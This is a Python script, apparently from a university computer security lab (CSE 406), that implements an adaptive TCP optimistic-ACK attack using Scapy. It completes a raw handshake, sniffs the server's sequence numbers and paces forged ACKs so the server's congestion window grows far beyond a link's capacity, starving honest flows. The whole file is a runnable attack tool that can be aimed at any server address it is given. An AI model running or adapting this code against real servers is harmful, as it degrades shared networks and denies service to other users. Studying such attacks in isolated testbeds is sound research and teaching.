#!/usr/bin/env python3
"""
optimistic_client.py — Adaptive TCP Optimistic ACK Generator (h2: 10.0.0.3)
CSE 406: Computer Security Lab Project

Performs a legitimate TCP 3-way handshake and HTTP GET, then adaptively
injects ACK segments that claim to have received all data the server has
sent — making the server perceive near-zero RTT and inflating its
congestion window far beyond the bottleneck's capacity.

The attacker is intelligent:
  1. Sniffs real data packets to track the server's highest sent seq (snd_nxt)
  2. Measures RTT from the handshake to compute the bandwidth-delay product
  3. ACKs up to snd_nxt (never beyond — avoids killing the connection)
  4. Paces ACKs to claim the full bottleneck bandwidth, starving honest flows

All traffic stays within the isolated Mininet testbed.
"""

import argparse
import logging
import signal
import struct
import sys
import threading
import time

from scapy.all import (
    IP, TCP, Raw, send, sr1, sniff, conf, RandShort
)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [OptACK] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("optimistic_client")

conf.verb = 0


class AdaptiveOptACKClient:
    """
    Adaptive optimistic ACK attacker.

    Strategy:
      - Complete a real TCP handshake + HTTP GET
      - Sniff incoming data to track the server's actual snd_nxt
      - Immediately ACK everything the server has sent (apparent RTT ≈ 0)
      - This causes exponential cwnd growth in slow-start:
        each ACK triggers 1 new segment, and since ACKs arrive instantly,
        the server exhausts its cwnd in microseconds instead of one RTT
      - The inflated cwnd floods the bottleneck, starving honest flows
      - Never ACK beyond snd_nxt — the connection stays healthy
    """

    def __init__(self, server_ip, server_port, src_port, target_bw_mbps,
                 duration, multiplier):
        self.server_ip = server_ip
        self.server_port = server_port
        self.src_port = src_port
        self.target_bw_mbps = target_bw_mbps
        self.duration = duration
        self.multiplier = multiplier

        self.c0 = int(RandShort()) << 16 | int(RandShort())
        self.s0 = None
        self.client_seq = None

        # Tracked state (updated by sniffer thread)
        self.lock = threading.Lock()
        self.server_snd_nxt = 0     # highest (seq + payload_len) seen
        self.last_acked = 0         # last ack_seq we sent
        self.data_pkts_seen = 0
        self.total_server_bytes = 0

        # Measured from handshake
        self.measured_rtt = None

        self.running = False
        self.sniffer_thread = None

        self.stats = {
            "acks_sent": 0,
            "bytes_claimed": 0,
            "honest_acks": 0,
            "optimistic_acks": 0,
        }

    # ------------------------------------------------------------------
    # Sequence number arithmetic (handles 32-bit wraparound)
    # ------------------------------------------------------------------
    @staticmethod
    def seq_after(a, b):
        return ((a - b) & 0xFFFFFFFF) < 0x80000000 and a != b

    @staticmethod
    def seq_max(a, b):
        return a if AdaptiveOptACKClient.seq_after(a, b) else b

    # ------------------------------------------------------------------
    # TCP Handshake — also measures RTT
    # ------------------------------------------------------------------
    def handshake(self):
        log.info("Starting 3-way handshake to %s:%d", self.server_ip,
                 self.server_port)

        syn = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.c0, flags="S",
                  options=[("MSS", 1460), ("WScale", 7)])
        )

        t0 = time.monotonic()
        syn_ack = sr1(syn, timeout=5)
        self.measured_rtt = time.monotonic() - t0

        if syn_ack is None or not syn_ack.haslayer(TCP):
            log.error("No SYN-ACK received — is the server running?")
            sys.exit(1)
        if syn_ack[TCP].flags != 0x12:
            log.error("Unexpected flags: 0x%02x", syn_ack[TCP].flags)
            sys.exit(1)

        self.s0 = syn_ack[TCP].seq
        initial_ack = (self.s0 + 1) & 0xFFFFFFFF
        self.last_acked = initial_ack
        self.server_snd_nxt = initial_ack
        self.client_seq = (self.c0 + 1) & 0xFFFFFFFF

        ack = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.client_seq, ack=initial_ack,
                  flags="A", window=65535)
        )
        send(ack)

        log.info("Handshake complete — server ISN=%d, measured RTT=%.1f ms",
                 self.s0, self.measured_rtt * 1000)

    # ------------------------------------------------------------------
    # HTTP GET
    # ------------------------------------------------------------------
    def send_get(self, path="/video.mp4"):
        http_req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {self.server_ip}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        )
        payload = http_req.encode()
        pkt = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.client_seq, ack=self.last_acked,
                  flags="PA", window=65535)
            / Raw(load=payload)
        )
        send(pkt)
        self.client_seq = (self.client_seq + len(payload)) & 0xFFFFFFFF
        log.info("Sent HTTP GET %s", path)

    # ------------------------------------------------------------------
    # Background sniffer — tracks the server's actual snd_nxt
    # ------------------------------------------------------------------
    def _sniffer_callback(self, pkt):
        if not pkt.haslayer(TCP):
            return
        tcp = pkt[TCP]
        if tcp.sport != self.server_port or tcp.dport != self.src_port:
            return

        seq = tcp.seq
        payload_len = len(pkt[TCP].payload) if pkt[TCP].payload else 0

        if payload_len > 0:
            new_nxt = (seq + payload_len) & 0xFFFFFFFF
            with self.lock:
                self.server_snd_nxt = self.seq_max(self.server_snd_nxt,
                                                    new_nxt)
                self.data_pkts_seen += 1
                self.total_server_bytes += payload_len

    def start_sniffer(self):
        bpf = (f"tcp and src host {self.server_ip} and src port "
               f"{self.server_port} and dst port {self.src_port}")

        def _run():
            sniff(filter=bpf, prn=self._sniffer_callback,
                  stop_filter=lambda _: not self.running,
                  store=False, timeout=self.duration + 10)

        self.sniffer_thread = threading.Thread(target=_run, daemon=True)
        self.sniffer_thread.start()

    # ------------------------------------------------------------------
    # Compute attack parameters from link characteristics
    # ------------------------------------------------------------------
    def compute_parameters(self):
        rtt = self.measured_rtt if self.measured_rtt else 0.1
        bw_bytes = self.target_bw_mbps * 1e6 / 8
        mss = 1460

        bdp_bytes = bw_bytes * rtt
        bdp_segments = int(bdp_bytes / mss)
        target_cwnd = int(bdp_segments * self.multiplier)
        target_inflight = target_cwnd * mss

        ack_rate = bw_bytes / mss
        ack_interval = 1.0 / ack_rate if ack_rate > 0 else 0.001

        log.info("=== Attack parameters (auto-computed) ===")
        log.info("  Measured RTT:     %.1f ms", rtt * 1000)
        log.info("  Bottleneck BW:    %d Mbps", self.target_bw_mbps)
        log.info("  BDP:              %d segments (%d bytes)",
                 bdp_segments, int(bdp_bytes))
        log.info("  Target cwnd:      %d segments (%.1fx BDP)",
                 target_cwnd, self.multiplier)
        log.info("  ACK rate:         %.0f ACKs/sec", ack_rate)
        log.info("  ACK interval:     %.2f ms", ack_interval * 1000)

        return ack_interval

    # ------------------------------------------------------------------
    # Adaptive ACK injection loop
    # ------------------------------------------------------------------
    def inject_acks(self):
        self.running = True
        self.start_sniffer()

        time.sleep(0.5)
        ack_interval = self.compute_parameters()

        start_time = time.monotonic()
        log.info("Starting adaptive ACK injection for %d s", self.duration)

        mss = 1460
        last_log_time = start_time

        while self.running:
            elapsed = time.monotonic() - start_time
            if elapsed >= self.duration:
                break

            with self.lock:
                current_snd_nxt = self.server_snd_nxt
                current_acked = self.last_acked

            if self.seq_after(current_snd_nxt, current_acked):
                # ACK everything the server has sent — instantly
                # This makes the server see near-zero RTT:
                #   real RTT = 100ms, but our ACK arrives in <1ms
                #   so the server thinks bandwidth = cwnd / 0.001
                #   and grows cwnd aggressively
                new_ack = current_snd_nxt

                ack_pkt = (
                    IP(dst=self.server_ip)
                    / TCP(sport=self.src_port, dport=self.server_port,
                          seq=self.client_seq, ack=new_ack,
                          flags="A", window=65535)
                )
                send(ack_pkt)

                advance = (new_ack - current_acked) & 0xFFFFFFFF

                with self.lock:
                    self.last_acked = new_ack

                self.stats["acks_sent"] += 1
                self.stats["bytes_claimed"] += advance
                self.stats["optimistic_acks"] += 1

            now = time.monotonic()
            if now - last_log_time >= 5.0:
                with self.lock:
                    pkts = self.data_pkts_seen
                    total = self.total_server_bytes
                log.info(
                    "t=%.0fs | ACKs=%d | server_data=%d pkts (%.1f MB) | "
                    "claimed=%.1f MB | snd_nxt_offset=+%d",
                    elapsed, self.stats["acks_sent"], pkts,
                    total / 1e6, self.stats["bytes_claimed"] / 1e6,
                    (current_snd_nxt - (self.s0 + 1)) & 0xFFFFFFFF)
                last_log_time = now

            time.sleep(ack_interval)

        self.running = False
        self._print_summary(time.monotonic() - start_time)

    def _print_summary(self, total_time):
        with self.lock:
            total_server = self.total_server_bytes
            data_pkts = self.data_pkts_seen

        log.info("=== Injection summary ===")
        log.info("Duration:         %.1f s", total_time)
        log.info("ACKs sent:        %d (optimistic: %d)",
                 self.stats["acks_sent"], self.stats["optimistic_acks"])
        log.info("Bytes claimed:    %d (%.2f MB)",
                 self.stats["bytes_claimed"],
                 self.stats["bytes_claimed"] / 1e6)
        log.info("Server data seen: %d pkts (%.2f MB)",
                 data_pkts, total_server / 1e6)
        if total_time > 0:
            attacker_bw = total_server * 8 / total_time / 1e6
            log.info("Attacker goodput: %.2f Mbps", attacker_bw)
        log.info("Effective ACK rate: %.0f ACKs/s",
                 self.stats["acks_sent"] / max(total_time, 0.001))

    # ------------------------------------------------------------------
    # Teardown
    # ------------------------------------------------------------------
    def teardown(self):
        fin = (
            IP(dst=self.server_ip)
            / TCP(sport=self.src_port, dport=self.server_port,
                  seq=self.client_seq, ack=self.last_acked,
                  flags="FA", window=65535)
        )
        send(fin)
        log.info("FIN sent — connection teardown initiated")

    def stop(self):
        self.running = False


def main():
    parser = argparse.ArgumentParser(
        description="Adaptive TCP Optimistic ACK generator for CSE 406 lab"
    )
    parser.add_argument("--server", default="10.0.1.2",
        help="Target server IP (default: 10.0.1.2)")
    parser.add_argument("--port", type=int, default=80,
        help="Target server port (default: 80)")
    parser.add_argument("--sport", type=int, default=44444,
        help="Source port (default: 44444)")
    parser.add_argument("--target-bw", type=int, default=10,
        help="Target bottleneck bandwidth in Mbps (default: 10)")
    parser.add_argument("--multiplier", type=float, default=5.0,
        help="Target cwnd as multiple of BDP (default: 5.0)")
    parser.add_argument("--duration", type=int, default=60,
        help="Attack duration in seconds (default: 60)")
    # Legacy args (ignored, kept for compatibility with run_experiment.sh)
    parser.add_argument("--delta", type=int, default=0)
    parser.add_argument("--rate", type=float, default=0)
    args = parser.parse_args()

    client = AdaptiveOptACKClient(
        server_ip=args.server,
        server_port=args.port,
        src_port=args.sport,
        target_bw_mbps=args.target_bw,
        duration=args.duration,
        multiplier=args.multiplier,
    )

    def sigint_handler(sig, frame):
        log.info("SIGINT received — stopping injection")
        client.stop()

    signal.signal(signal.SIGINT, sigint_handler)

    client.handshake()
    time.sleep(0.5)
    client.send_get()
    time.sleep(1.0)
    client.inject_acks()
    client.teardown()


if __name__ == "__main__":
    main()
